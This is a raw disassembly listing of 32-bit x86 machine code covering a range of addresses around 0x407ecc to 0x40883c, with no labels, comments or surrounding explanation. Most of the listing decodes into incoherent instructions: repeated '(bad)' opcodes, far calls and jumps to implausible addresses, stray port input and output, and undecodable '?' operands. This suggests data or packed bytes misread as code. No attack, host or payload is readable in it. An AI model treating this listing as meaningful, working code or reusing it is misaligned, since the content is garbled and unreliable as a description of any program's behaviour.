  407ecc:	cmp    DWORD PTR [esi],esi
  407ece:	xchg   ecx,eax
  407ecf:	lock push es
  407ed1:	ds inc edi
  407ed3:	dec    DWORD PTR [esp+ecx*1+0x1d]
  407ed7:	inc    ecx
  407ed8:	cmp    DWORD PTR [ecx+0x73],eax
  407edb:	mov    bl,0xf6
  407edd:	xchg   ebp,eax
  407ede:	jge    0x407e65
  407ee0:	loope  0x407f47
  407ee2:	inc    edi
  407ee3:	push   DWORD PTR [ebx+ebx*8+0x6ddef727]
  407eea:	mov    ah,0x67
  407eec:	out    dx,eax
  407eed:	xor    ah,al
  407eef:	dec    edi
  407ef1:	add    edx,DWORD PTR [edi+esi*8-0x3a]
  407ef5:	lds    eax,FWORD PTR [esi+0x35]
  407ef8:	inc    esp
  407ef9:	inc    eax
  407efa:	(bad)  
  407efb:	call   FWORD PTR [esi-0x51006db8]
  407f01:	push   ecx
  407f02:	inc    ebx
  407f03:	je     0x407f45
  407f05:	fimul  DWORD PTR [eax+0xdc]
	...
  407f1b:	add    BYTE PTR [esi+0xc0446ad],ah
  407f21:	dec    ecx
  407f22:	inc    esi
  407f23:	xor    BYTE PTR [esi-0x79089c2d],bh
  407f29:	add    eax,0xc93ce7b4
  407f2e:	inc    esi
  407f2f:	jmp    DWORD PTR [edx+0x2c]
  407f32:	cli    
  407f33:	mov    edi,0xb3eeffe5
  407f38:	pop    esi
  407f39:	adc    BYTE PTR [ecx+0x47],bl
  407f3c:	pop    esi
  407f3d:	ds ins BYTE PTR es:[edi],dx
  407f3f:	fs dec esi
  407f41:	inc    esi
  407f42:	push   cs
  407f43:	icebp  
  407f44:	dec    esi
  407f45:	inc    esi
  407f46:	jmp    0xf69c03cd
  407f4b:	inc    esi
  407f4c:	ds (bad) 
  407f4e:	jl     0x407f15
  407f50:	mov    ebx,0x2e4efd83
  407f55:	inc    esi
  407f56:	jmp    0x9cc22d2a
  407f5b:	pop    ebx
  407f5c:	es inc esi
  407f5e:	(bad)  
  407f5f:	add    ecx,DWORD PTR [ebp-0x43fbbd2c]
  407f65:	jnp    0x407f08
  407f67:	dec    esi
  407f68:	push   es
  407f69:	inc    esi
  407f6a:	sbb    DWORD PTR [edi-0x3c],eax
  407f6d:	pop    esp
  407f6e:	mov    esi,0x1b58f646
  407f73:	xor    esi,ebp
  407f75:	inc    ebp
  407f76:	repnz inc ebx
  407f78:	ins    DWORD PTR es:[edi],dx
  407f79:	lods   al,BYTE PTR ds:[esi]
  407f7a:	imul   ecx,DWORD PTR [eax+0x46964e01],0x0
	...
  407f94:	cmp    esp,ecx
  407f96:	and    esp,ebx
  407f98:	into   
  407f99:	inc    ebp
  407f9a:	xchg   esi,eax
  407f9b:	test   esi,eax
  407f9d:	retf   
  407f9e:	lock pop ebx
  407fa0:	push   esi
  407fa1:	xchg   esp,eax
  407fa2:	jbe    0x407fea
  407fa4:	mov    dh,0x8b
  407fa6:	jge    0x407ff6
  407fa8:	scas   al,BYTE PTR es:[edi]
  407fa9:	inc    ebp
  407faa:	data16 sar BYTE PTR [esi],1
  407fad:	pop    eax
  407fae:	mov    ds:0x56459e97,al
  407fb3:	nop
  407fb4:	mov    eax,ds:0x8e464e4d
  407fb9:	retf   
  407fba:	lock pop ebx
  407fbc:	aam    0x94
  407fbe:	ds inc esi
  407fc0:	jle    0x407f4d
  407fc2:	add    BYTE PTR [ecx],dl
  407fc4:	pop    es
  407fc5:	inc    ebp
  407fc6:	jmp    FWORD PTR [esi]
  407fc8:	leave  
  407fc9:	pop    esp
  407fca:	mul    DWORD PTR [esi]
  407fcc:	inc    DWORD PTR [ebp+esi*2-0xf]
  407fd0:	add    dl,bl
  407fd2:	stos   DWORD PTR es:[edi],eax
  407fd3:	push   ss
  407fd4:	inc    DWORD PTR [ebp+esi*4+0x9]
  407fd8:	inc    DWORD PTR [edi+edi*8+0x6]
  407fdc:	imul   edi,ebp,0x45a6d0e7
  407fe2:	push   esi
  407fe4:	(bad)  
  407fe5:	pop    ebx
  407fe6:	imul   esi
  407fe8:	je     0x408042
  407fea:	xchg   ebp,eax
  407feb:	xchg   esi,eax
  407fec:	jl     0x408033
  407fee:	call   DWORD PTR [ecx+eax*4+0x75d6ff4d]
  407ff5:	jp     0x407fa6
  407ff7:	into   
	...
  40800c:	je     0x408053
  40800e:	mov    ch,0xd1
  408010:	je     0x408057
  408012:	call   ecx
  408014:	hlt    
  408015:	xchg   ebp,eax
  408016:	push   DWORD PTR [esi-0x490f7484]
  40801c:	je     0x408063
  40801e:	call   0xff854c40
  408023:	sahf   
  408024:	sahf   
  408025:	dec    esp
  408026:	jmp    0xff85ff56
  40802b:	mov    ?,esi
  40802d:	dec    eax
  40802e:	call   0x403a7a
  408033:	scas   eax,DWORD PTR es:[edi]
  408034:	jnp    0x40802e
  408036:	call   FWORD PTR [ebx]
  408038:	xor    BYTE PTR [ebx+eax*4-0x5b],dl
  40803c:	or     DWORD PTR [ebp+0x75],eax
  40803f:	cmc    
  408040:	add    ch,BYTE PTR [esi+0x773ae97f]
  408046:	inc    ebp
  408047:	push   ecx
  408048:	cld    
  408049:	retf   0x41f7
  40804c:	xlat   BYTE PTR ds:[ebx]
  40804d:	xchg   ebp,eax
  40804e:	inc    DWORD PTR [eax]
  408050:	dec    eax
  408052:	inc    esp
  408053:	cld    
  408054:	aas    
  408055:	xor    eax,0xb8b5fffb
  40805a:	(bad)  
  40805b:	jne    0x407fe9
  40805d:	test   al,0x16
  40805f:	mov    ebx,0xc00abb1f
  408064:	(bad)  
  408065:	cli    
  408066:	mov    BYTE PTR [ebp+0x34],al
  408069:	sub    bh,bh
  40806b:	mov    WORD PTR [ebp+0xff4fb4],ss
	...
  408081:	add    BYTE PTR [eax],al
  408083:	add    ch,al
  408085:	mov    esp,0xbb247be7
  40808a:	dec    BYTE PTR [ebx]
  40808c:	pusha  
  40808d:	xor    BYTE PTR [eax],ch
  40808f:	push   0xbeee5020
  408094:	pop    ds
  408095:	xor    eax,DWORD PTR [edi]
  408097:	call   0x3fe955
  40809c:	out    dx,eax
  40809d:	xor    dh,bh
  40809f:	jmp    DWORD PTR [ebp+0x48]
  4080a2:	(bad)  
  4080a3:	jne    0x4080ad
  4080a5:	test   al,0xc0
  4080a7:	stos   DWORD PTR es:[edi],eax
  4080a8:	mov    edi,0xb475febc
  4080ad:	mov    esp,0x329ffc74
  4080b2:	pop    es
  4080b3:	call   0x3fe93b
  4080b8:	mov    edi,0xbce8fb32
  4080bd:	ins    DWORD PTR es:[edi],dx
  4080be:	(bad)  
  4080bf:	call   FWORD PTR [ecx+0x250007c1]
  4080c5:	leave  
  4080c6:	jmp    0x40804b
  4080c8:	xchg   esp,eax
  4080c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ca:	push   ebp
  4080cb:	push   DWORD PTR [ebp+0x73ade74b]
  4080d1:	mov    esp,0x32500bfe
  4080d6:	add    al,0x5e
  4080d8:	imul   eax,ecx,0xdc390007
  4080de:	mov    ebp,0xcdb1e9ef
  4080e3:	or     edx,DWORD PTR [ecx+0xff8f9a]
	...
  4080f9:	add    BYTE PTR [eax],al
  4080fb:	add    BYTE PTR [esi+0x4e],bh
  4080fe:	inc    ebx
  4080ff:	bsr    ebp,DWORD PTR [edi+0x12390002]
  408106:	into   
  408107:	sti    
  408108:	push   ecx
  408109:	push   cs
  40810a:	xchg   ebp,eax
  40810b:	call   FWORD PTR [esi-0x30]
  40810e:	mov    ebp,0x476456eb
  408113:	inc    esp
  408115:	inc    esp
  408116:	inc    ebx
  408117:	jne    0x40815a
  408119:	icebp  
  40811a:	push   ecx
  40811b:	scas   al,BYTE PTR es:[edi]
  40811c:	ds inc edx
  40811e:	ja     0x408195
  408120:	and    eax,0x3e67b9fe
  408125:	nop
  408126:	ret    0x8cff
  408129:	xor    ebp,eax
  40812b:	cmp    BYTE PTR [ecx],0x59
  40812e:	push   cs
  40812f:	ror    BYTE PTR [edi+edx*2+0x28c23d2e],0xac
  408137:	push   cs
  408138:	inc    eax
  408139:	sbb    BYTE PTR [eax+ebp*8],al
  40813c:	mov    ah,0x1
  40813e:	add    al,0x0
  408140:	cmp    cl,BYTE PTR [ecx-0x3f1e8a73]
  408146:	and    DWORD PTR [ecx],edi
  408148:	js     0x4081a3
  40814a:	(bad)  
  40814c:	fadd   DWORD PTR ds:[ebx]
  40814f:	add    BYTE PTR [edx-0x67],al
  408152:	mov    ecx,0x8d4de201
  408157:	adc    bh,bh
  408159:	pop    eax
  40815a:	add    edx,DWORD PTR [eax+0x6b]
  40815d:	ret    0xe7b8
	...
  408174:	mov    dh,0x43
  408176:	or     ebp,eax
  408178:	mov    al,0xd2
  40817a:	inc    edx
  40817b:	inc    DWORD PTR [ebx]
  40817d:	add    cl,al
  40817f:	mov    ecx,DWORD PTR [ecx-0x80]
  408182:	pop    ds
  408183:	add    al,0xc
  408185:	mov    es,ecx
  408187:	add    al,0x29
  408189:	push   ebx
  40818a:	pop    DWORD PTR [ebx+0xc]
  40818d:	clc    
  40818e:	push   eax
  40818f:	push   eax
  408190:	rol    DWORD PTR [edx+0x3e],cl
  408193:	inc    ebx
  408194:	in     al,dx
  408195:	inc    ebx
  408196:	ss mov ecx,0xbb44262
  40819c:	push   ecx
  40819d:	dec    ebx
  40819e:	push   ebx
  40819f:	inc    ebx
  4081a0:	pop    esi
  4081a1:	inc    edx
  4081a2:	xchg   esp,eax
  4081a3:	das    
  4081a4:	popa   
  4081a5:	adc    al,0x47
  4081a7:	inc    ebx
  4081a8:	dec    esi
  4081a9:	je     0x40814f
  4081ab:	xor    ebp,ecx
  4081ad:	push   edi
  4081ae:	call   0x9704:0x12423e77
  4081b5:	aaa    
  4081b6:	sub    ecx,DWORD PTR [ecx+edi*1]
  4081b9:	stos   DWORD PTR es:[edi],eax
  4081ba:	popa   
  4081bb:	xor    BYTE PTR [edx+0x1eade53c],bh
  4081c1:	fdiv   st,st(3)
  4081c3:	inc    edx
  4081c4:	mov    eax,?
  4081c6:	rol    dh,0xe3
  4081c9:	inc    ecx
  4081ca:	into   
  4081cb:	mov    WORD PTR [esp+eax*2+0x51],?
  4081cf:	pop    edi
  4081d0:	inc    ecx
  4081d1:	mov    edi,0xf86c42e8
  4081d6:	shr    BYTE PTR [edx+0x0],0x0
	...
  4081ea:	add    BYTE PTR [eax],al
  4081ec:	in     eax,dx
  4081ed:	inc    ecx
  4081ee:	scas   al,BYTE PTR es:[edi]
  4081ef:	lods   eax,DWORD PTR ds:[esi]
  4081f0:	out    0xd9,al
  4081f2:	(bad)  
  4081f4:	jns    0x4081f6
  4081f6:	adc    ebp,esp
  4081f8:	adc    DWORD PTR [edi-0x34fbbd18],edi
  4081fe:	mov    edi,0x8559c6c4
  408203:	jae    0x4081c3
  408205:	inc    ecx
  408206:	repnz inc ebx
  408208:	sub    eax,0x4100ffe6
  40820d:	pop    es
  40820e:	inc    ecx
  40820f:	jmp    0x9908db9e
  408214:	sti    
  408215:	inc    eax
  408216:	push   eax
  408217:	mov    ecx,0x4107cafb
  40821c:	push   edi
  40821d:	inc    edx
  40821e:	dec    DWORD PTR [esi+0x52]
  408221:	cmp    ch,BYTE PTR [ebp+0x19d5fb46]
  408227:	push   ecx
  408228:	dec    eax
  408229:	mov    ?,edi
  40822b:	ss aas 
  40822d:	inc    eax
  40822e:	je     0x408234
  408230:	xchg   ebp,eax
  408231:	dec    ecx
  408232:	cmp    BYTE PTR [eax+0x4ae7b03a],ch
  408238:	int    0x40
  40823a:	inc    DWORD PTR [ecx-0x16bef8ca]
  408240:	push   0x59
  408242:	cwde   
  408243:	cmp    bl,bh
  408245:	inc    eax
  408246:	push   eax
  408247:	cdq    
  408248:	jnp    0x408215
  40824a:	pop    es
  40824b:	add    DWORD PTR [edi+0xeeff42],esp
	...
  408261:	add    BYTE PTR [eax],al
  408263:	add    BYTE PTR [ebx+0x6a],dl
  408266:	lods   eax,DWORD PTR ds:[esi]
  408267:	out    0x78,al
  408269:	(bad)  
  40826a:	sbb    edx,ecx
  40826c:	fwait
  40826d:	(bad)  
  40826e:	call   esi
  408270:	cmp    al,0x40
  408272:	je     0x408278
  408274:	aad    0x48
  408276:	cmp    BYTE PTR [eax],ch
  408278:	xor    eax,0x6a3ae7b0
  40827d:	inc    ecx
  40827e:	inc    DWORD PTR [ecx+0x41]
  408281:	pop    es
  408282:	inc    ecx
  408283:	jmp    0x58a8db92
  408288:	js     0x4082cb
  40828a:	push   eax
  40828b:	cmp    DWORD PTR [eax-0x35],edi
  40828e:	pop    es
  40828f:	xor    DWORD PTR [ecx+eax*2-0x25ea7101],0xbeb700ac
  40829a:	imul   esp,DWORD PTR [ebx],0xffb0cdc8
  4082a0:	daa    
  4082a1:	repz mov edi,0xf7947d74
  4082a7:	cmp    cl,dl
  4082a9:	cld    
  4082aa:	dec    edi
  4082ab:	call   0x3f5093
  4082b0:	js     0x4082aa
  4082b2:	cmp    BYTE PTR [ecx-0x70],al
  4082b5:	sub    al,0xe7
  4082b7:	cmp    BYTE PTR [ecx],al
  4082b9:	mov    edi,0xbfd050fe
  4082be:	je     0x4082c8
  4082c0:	clc    
  4082c1:	sub    bh,ch
  4082c3:	call   DWORD PTR [edi]
  4082c5:	adc    al,0x36
  4082c7:	lods   eax,DWORD PTR ds:[esi]
	...
  4082dc:	pop    ss
  4082dd:	mov    edi,0xbf3475fe
  4082e2:	je     0x4082ec
  4082e4:	cmp    ch,dl
  4082e6:	test   eax,0xc1b537ff
  4082eb:	add    al,0x50
  4082ed:	sub    DWORD PTR [edx-0x24375e14],ecx
  4082f3:	mul    DWORD PTR [edi]
  4082f5:	ror    DWORD PTR [ebp+eax*2+0x75fe5414],0x20
  4082fd:	shl    DWORD PTR [esp+ecx*1-0x18],0x70
  408302:	jle    0x408304
  408304:	and    BYTE PTR ds:0x819d0fc0,cl
  40830a:	add    DWORD PTR [eax],eax
  40830c:	adc    cl,cl
  40830e:	inc    esp
  40830f:	clc    
  408310:	loopne 0x408315
  408312:	add    BYTE PTR [eax],al
  408314:	lahf   
  408315:	inc    esi
  408316:	repz (bad) 
  408318:	fild   WORD PTR [ebx]
  40831a:	add    BYTE PTR [edx-0x30],ch
  40831d:	ins    DWORD PTR es:[edi],dx
  40831e:	jmp    FWORD PTR [ecx-0x20]
  408321:	ins    DWORD PTR es:[edi],dx
  408322:	dec    DWORD PTR [ecx+edi*1-0x4bafc814]
  408329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40832a:	idiv   DWORD PTR ss:[esi+0x2cfed386]
  408331:	add    DWORD PTR [eax+0x75],0x7ec281ad
  408338:	cmp    DWORD PTR [ecx],ebp
  40833a:	or     al,0xc0
  40833c:	and    eax,0x812a2c
	...
  408351:	add    BYTE PTR [eax],al
  408353:	add    BYTE PTR [eax],bh
  408355:	sub    DWORD PTR [ebx],eax
  408357:	push   0xffc30197
  40835c:	xchg   DWORD PTR [ebx+edx*1-0x18],edx
  408360:	adc    eax,0x9ff3fb9
  408365:	mov    dl,0x52
  408367:	lea    esi,[ebp+edi*8-0x669900c9]
  40836e:	aad    0xe7
  408370:	add    eax,0xc0ff3fd9
  408375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408376:	xor    dh,bh
  408378:	dec    esi
  408379:	push   ss
  40837a:	sub    ebp,DWORD PTR [edx+0x6a400e95]
  408380:	cmp    DWORD PTR [ecx+0x297838d6],edx
  408386:	inc    eax
  408387:	mov    ch,0x29
  408389:	ds aas 
  40838b:	jmp    DWORD PTR [esi]
  40838d:	mov    ah,0xe
  40838f:	call   0xff801960
  408394:	shl    BYTE PTR [ebx+0x560ef727],0xaa
  40839b:	call   FWORD PTR [esi+0x3940fcef]
  4083a1:	inc    esi
  4083a2:	jns    0x408394
  4083a4:	out    dx,al
  4083a5:	jge    0x4083e6
  4083a7:	jmp    DWORD PTR [ebp+eiz*1+0x2b]
  4083ab:	xchg   edx,eax
  4083ac:	xchg   esi,eax
  4083ad:	ins    DWORD PTR es:[edi],dx
  4083ae:	aas    
  4083af:	mov    DWORD PTR [edi+edi*8+0x3ed63788],esi
  4083b6:	adc    eax,DWORD PTR [eax+eax*1]
	...
  4083c9:	add    BYTE PTR [eax],al
  4083cb:	add    BYTE PTR [ecx-0x3b],ah
  4083ce:	iret   
  4083cf:	(bad)  
  4083d0:	(bad)  
  4083d1:	cmp    eax,0x3ec63454
  4083d6:	xchg   BYTE PTR [edi],bh
  4083d8:	sub    al,0xc
  4083da:	xchg   ecx,eax
  4083db:	mov    bh,0xdf
  4083dd:	ds jbe 0x40836d
  4083e0:	mov    esp,0x9e3f762b
  4083e5:	test   eax,0xf902abe8
  4083ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083eb:	add    ecx,DWORD PTR [esi-0x79c8a68c]
  4083f1:	ds dec esi
  4083f3:	mov    ecx,0x6ea52832
  4083f8:	jbe    0x408438
  4083fa:	jo     0x408385
  4083fc:	popa   
  4083fd:	ss ss aas 
  408400:	sar    edi,cl
  408402:	shr    BYTE PTR [ebx+0x3ee8c121],0x8c
  408409:	das    
  40840a:	push   ss
  40840b:	aas    
  40840c:	dec    esi
  40840d:	ds pushf 
  40840f:	sqrtps xmm0,xmm0
  408412:	cmp    eax,0x6c883e3f
  408417:	pusha  
  408418:	cs inc BYTE PTR ds:[edx+0x3efe24ec]
  408420:	add    DWORD PTR es:[esp+ecx*1-0x46],esi
  408425:	jnp    0x4083f0
  408427:	ss push ss
  408429:	ds jmp 0x94c219e6
  40842f:	das    
	...
  408444:	push   cs
  408445:	ds into 
  408447:	add    eax,DWORD PTR [ebp-0x1e7f9624]
  40844d:	xor    eax,0xb4393ebe
  408452:	call   FWORD PTR [ecx]
  408454:	xchg   ebp,eax
  408455:	cmp    eax,0x3d5cbeff
  40845a:	jne    0x40844d
  40845c:	and    bh,BYTE PTR [ecx+0x3d0f9ea7]
  408462:	mov    ch,0x85
  408464:	(bad)  
  408466:	dec    DWORD PTR [esi-0x4917fa7f]
  40846c:	and    bh,BYTE PTR ds:0x28317eff
  408472:	div    DWORD PTR [esi+0x67]
  408475:	cmp    eax,0x3f52e175
  40847a:	test   al,0x66
  40847c:	push   edi
  40847d:	cmp    eax,0x3d4745b5
  408482:	call   DWORD PTR [esi-0x3f]
  408485:	add    eax,0x3d129ae8
  40848a:	inc    DWORD PTR [esi-0xf]
  40848d:	pop    ds
  40848e:	idiv   DWORD PTR [esi]
  408490:	das    
  408491:	cmp    eax,0x6312e175
  408496:	test   al,0x2e
  408498:	pop    ds
  408499:	cmp    eax,0x3d0f45b5
  40849e:	call   FWORD PTR [esi]
  4084a0:	xchg   ecx,eax
  4084a1:	add    eax,0x3cd27ee8
  4084a6:	dec    DWORD PTR [esi]
	...
  4084bc:	shl    DWORD PTR [ebx],0xf7
  4084bf:	push   es
  4084c0:	ja     0x4084ea
  4084c2:	mov    eax,ds:0xff3d6f52
  4084c7:	cmp    al,0x5a
  4084c9:	xor    eax,0x9653eeff
  4084ce:	stos   DWORD PTR es:[edi],eax
  4084cf:	out    0x54,al
  4084d1:	cmp    eax,0x3d44cdb5
  4084d6:	inc    ecx
  4084d8:	mov    al,0x68
  4084da:	dec    esi
  4084dc:	cmp    al,0x73
  4084de:	call   0xff3b3be3
  4084e3:	call   0x3f2c48
  4084e8:	scas   eax,DWORD PTR es:[edi]
  4084e9:	mov    ah,0xdb
  4084eb:	test   DWORD PTR [edi+0x6b75e7fa],0x65fffefb
  4084f5:	hlt    
  4084f6:	idiv   bh
  4084f8:	scas   eax,DWORD PTR es:[edi]
  4084f9:	cli    
  4084fa:	je     0x408508
  4084fc:	scas   eax,DWORD PTR es:[edi]
  4084fd:	je     0x408506
  4084ff:	call   0x3f7f81
  408504:	das    
  408505:	mov    ch,0xef
  408507:	imul   DWORD PTR [edi]
  408509:	sti    
  40850a:	out    0x59,eax
  40850c:	sti    
  40850d:	cli    
  40850e:	(bad)  
  40850f:	jmp    ebp
  408511:	clc    
  408512:	call   0xff3b7368
  408517:	jmp    DWORD PTR [ebp-0x4]
  40851a:	out    0xa3,eax
  40851c:	ins    DWORD PTR es:[edi],dx
  40851d:	add    BYTE PTR [eax],al
  40851f:	leave  
	...
  408534:	and    dl,BYTE PTR [eax]
  408536:	add    BYTE PTR [ebp-0x15],dl
  408539:	out    dx,eax
  40853a:	add    ah,0x2c
  40853d:	push   0xffffffff
  40853f:	imul   eax,DWORD PTR [esi+0x280874fb],0x2fffa767
  408549:	mov    DWORD PTR [ebp-0x4],eax
  40854c:	mov    eax,0x5041386e
  408551:	push   0x80200001
  408556:	push   DWORD PTR [ebp+0x28]
  408559:	call   0xfd708354
  40855e:	addr16 jb 0x40854a
  408561:	ds (bad) 
  408563:	(bad)  
  408564:	xor    eax,0x20412873
  408569:	std    
  40856a:	je     0x408574
  40856c:	cmp    DWORD PTR [ecx+0x27],eax
  40856f:	std    
  408570:	dec    BYTE PTR [edx+0x3c]
  408573:	jne    0x40856a
  408575:	inc    edx
  408576:	mov    dh,0x7
  408578:	loope  0x408575
  40857a:	imul   edi,edi,0xffffffe6
  40857d:	pusha  
  40857e:	inc    ecx
  40857f:	add    al,0x39
  408581:	adc    al,0x89
  408583:	in     al,dx
  408584:	mov    eax,0xcef75f6d
  408589:	call   0x753c:0xf9c5458e
  408590:	sub    DWORD PTR [edx-0x125ef44a],ecx
  408596:	mov    esi,0xff
	...
  4085ab:	add    BYTE PTR [esi-0x43f0bcd2],ch
  4085b1:	repz add DWORD PTR [eax],eax
  4085b4:	cmp    DWORD PTR [edx-0x3a],esp
  4085b7:	idiv   DWORD PTR [ecx]
  4085b9:	sub    DWORD PTR [ebx],eax
  4085bb:	add    BYTE PTR [esi+0x64],dh
  4085be:	aaa    
  4085bf:	(bad)  
  4085c0:	sub    DWORD PTR ds:[ebx],eax
  4085c3:	push   0x39
  4085c5:	aas    
  4085c6:	add    ebp,DWORD PTR [edx+0x39]
  4085c9:	dec    edi
  4085ca:	add    ecx,DWORD PTR [ebp-0x732d0b0c]
  4085d0:	mov    esp,0x5eff33fd
  4085d5:	cdq    
  4085d6:	cmp    al,0x75
  4085d8:	push   ecx
  4085d9:	loop   0x408590
  4085db:	sti    
  4085dc:	popa   
  4085dd:	xor    edi,DWORD PTR [esi+0x431e46ff]
  4085e3:	je     0x408619
  4085e5:	add    BYTE PTR [edx-0x54d6c6ff],al
  4085eb:	in     eax,0x61
  4085ed:	push   0x59acff03
  4085f2:	sub    edi,DWORD PTR [ecx]
  4085f4:	iret   
  4085f5:	sub    DWORD PTR [ebx],edi
  4085f7:	push   eax
  4085f8:	ret    0xb8ff
  4085fb:	mov    DWORD PTR [ebx+esi*1-0x2ff9c42a],esi
  408602:	cmp    ch,BYTE PTR [eax+edx*2]
  408605:	push   0xffffffce
  408607:	cmp    eax,eax
  408609:	test   BYTE PTR [ecx-0x2ec511cd],bh
  40860f:	mov    ebx,0x0
	...
  408624:	nop
  408625:	cmp    dh,BYTE PTR [esi+0x73a2deae]
  40862b:	std    
  40862c:	jns    0x40862e
  40862e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40862f:	jno    0x4085fa
  408631:	xor    bl,BYTE PTR [esi-0x1b4b39c5]
  408637:	sub    edi,DWORD PTR [ebx-0x3fc47194]
  40863d:	test   BYTE PTR [ebp+0x133aae33],cl
  408643:	add    al,0x11
  408645:	inc    ecx
  408646:	mov    al,0xc4
  408648:	sahf   
  408649:	cmp    DWORD PTR [esp+esi*1],esi
  40864c:	mov    ?,WORD PTR [edx]
  40864e:	cmp    ax,WORD PTR [esp+ecx*1]
  408652:	push   ecx
  408653:	mov    ds:0x8d563ad5,eax
  408658:	mov    ah,0x1f
  40865a:	push   esi
  40865b:	cmp    esi,DWORD PTR [esi-0x5b]
  40865e:	call   0xa839560e
  408663:	add    esp,DWORD PTR [esi+0x74]
  408666:	cmp    DWORD PTR [ebx],esi
  408668:	pop    esi
  408669:	cmp    ch,BYTE PTR [esi]
  40866b:	mov    cl,0x42
  40866d:	sub    BYTE PTR [ebp+0x703a4e68],dh
  408673:	adc    DWORD PTR [ebp+0x32],0xffd33b16
  40867a:	sub    BYTE PTR [eax+esi*2-0x41],0xe8
  40867f:	cmp    ah,ah
  408681:	xor    dh,dh
  408683:	cmp    ah,BYTE PTR [esi]
  408685:	cmp    al,BYTE PTR [eax]
  408687:	jl     0x408689
	...
  408699:	add    BYTE PTR [eax],al
  40869b:	add    BYTE PTR [esi],dh
  40869d:	sub    BYTE PTR [ecx],dh
  40869f:	cmp    al,0x52
  4086a1:	cmp    DWORD PTR [ecx-0xce9d94],ecx
  4086a7:	(bad)  
  4086a9:	cmp    DWORD PTR [edi-0x59],esp
  4086ac:	std    
  4086ad:	sar    bh,0xcd
  4086b0:	imul   esi,DWORD PTR [eax],0x3933c6f7
  4086b6:	jne    0x4086a5
  4086b8:	adc    dl,BYTE PTR [edx]
  4086ba:	lods   eax,DWORD PTR ds:[esi]
  4086bb:	mov    dh,0x23
  4086bd:	xchg   DWORD PTR [ebp-0xc6f473],eax
  4086c3:	push   0x51
  4086c5:	and    al,0xf7
  4086c7:	sahf   
  4086c8:	add    eax,DWORD PTR [eax]
  4086ca:	jne    0x4086ac
  4086cc:	mov    bh,0x7b
  4086ce:	loopne 0x408666
  4086d0:	jae    0x40870b
  4086d2:	add    ch,bh
  4086d4:	fnstcw WORD PTR [esi-0x43]
  4086d7:	lea    ebp,[ebx+0x39]
  4086da:	(bad)  
  4086db:	jmp    0x2cc35cae
  4086e0:	bound  esi,QWORD PTR [ecx]
  4086e2:	jmp    DWORD PTR [esi+0x3a]
  4086e5:	mov    ah,0x52
  4086e7:	sar    DWORD PTR [edx],1
  4086e9:	add    bh,ch
  4086eb:	xchg   edi,eax
  4086ec:	inc    ebx
  4086ed:	mov    bl,0x7
  4086ef:	inc    ecx
  4086f0:	mov    ah,BYTE PTR [ebx-0x1]
  4086f3:	inc    esi
  4086f4:	xor    esi,DWORD PTR [ebx-0x14]
  4086f7:	and    edi,DWORD PTR ss:[ecx]
  4086fa:	(bad)  
  4086fb:	mov    esp,0x87a42832
	...
  408714:	adc    edi,DWORD PTR [ecx]
  408716:	call   FWORD PTR [edx+eiz*1+0x31]
  40871a:	call   FWORD PTR [esi]
  40871c:	add    esi,DWORD PTR [ebx+0x62a80107]
  408722:	dec    DWORD PTR [esi]
  408724:	jae    0x408799
  408726:	in     al,0x0
  408728:	das    
  408729:	idiv   esi
  40872b:	jmp    FWORD PTR [ebp+0x6e88e805]
  408731:	idiv   dh
  408733:	dec    DWORD PTR [ebp-0x23]
  408736:	idiv   bh
  408738:	pop    ss
  408739:	div    DWORD PTR [eax+ecx*1-0x18]
  40873d:	jns    0x4086e4
  40873f:	jmp    edi
  408741:	div    BYTE PTR [esp+ebx*8-0x108f1]
  408748:	sub    eax,0xbe6ce80c
  40874d:	idiv   dh
  40874f:	call   FWORD PTR [ebp-0x20]
  408752:	idiv   bh
  408754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408755:	jmp    0x4087cc
  408757:	test   eax,0xb5fef697
  40875c:	mov    al,0xee
  40875e:	(bad)  
  40875f:	(bad)  
  408760:	mov    eax,0xc7ffa86a
  408765:	div    BYTE PTR [esp+ebp*8-0x170108d1]
  40876c:	xor    BYTE PTR [ebp-0x56d80002],ah
  408772:	out    0xf7,eax
  408774:	daa    
  408775:	mul    edi
  408777:	push   ebp
	...
  40878c:	test   eax,0xadfffef6
  408791:	xlat   BYTE PTR ds:[ebx]
  408792:	idiv   bh
  408794:	out    0xeb,eax
  408796:	dec    ecx
  408797:	test   eax,0xb5fef707
  40879c:	xor    bh,ch
  40879e:	(bad)  
  40879f:	jmp    DWORD PTR [edi]
  4087a1:	imul   ecx,DWORD PTR [ebx],0xe8049dff
  4087a7:	cmp    eax,0xfffef726
  4087ac:	in     eax,dx
  4087ad:	repz idiv bh
  4087b0:	daa    
  4087b1:	in     al,dx
  4087b2:	sub    eax,0x391239a9
  4087b7:	(bad)  
  4087b8:	jl     0x4087cb
  4087ba:	sub    edx,DWORD PTR [ecx+0x2f]
  4087bd:	(bad)  
  4087be:	cmp    bh,bh
  4087c0:	lods   al,BYTE PTR ds:[esi]
  4087c1:	xor    eax,0x29a2782b
  4087c6:	add    ecx,ecx
  4087c8:	sti    
  4087c9:	push   ebp
  4087ca:	add    edx,DWORD PTR [ebp-0x3e]
  4087cd:	dec    ebp
  4087ce:	test   ah,al
  4087d0:	add    eax,0x266a03d4
  4087d5:	dec    esi
  4087d6:	scas   al,BYTE PTR es:[edi]
  4087d7:	pop    es
  4087d8:	loope  0x4087c3
  4087da:	popa   
  4087db:	(bad)  
  4087dc:	out    dx,al
  4087dd:	mov    al,0xbd
  4087df:	sti    
  4087e0:	push   ecx
  4087e1:	(bad)  
  4087e2:	cli    
  4087e3:	inc    eax
  4087e4:	cmp    DWORD PTR [esi-0x12],ebp
  4087e7:	je     0x408809
  4087e9:	call   0x318586f1
  4087ee:	sub    esi,esi
	...
  408804:	les    edx,FWORD PTR [esi+0x50e26838]
  40880a:	ret    0x1eff
  40880d:	sub    eax,DWORD PTR [ebx]
  40880f:	add    BYTE PTR [ecx-0x6ef85182],bh
  408815:	jge    0x40884d
  408817:	call   FWORD PTR [esi-0x69045252]
  40881d:	sub    al,0xb
  40881f:	call   0xff790f0e
  408824:	jo     0x408811
  408826:	(bad)  
  408827:	jmp    ebp
  408829:	mov    eax,ds:0xf57d8126
  40882e:	das    
  40882f:	jmp    FWORD PTR [esi-0x54]
  408832:	mov    ebp,0xadf609fb
  408837:	divps  xmm6,XMMWORD PTR [edi+eax*1-0x18]
  40883c:	xor    BYTE PTR [edx+0x3],dh
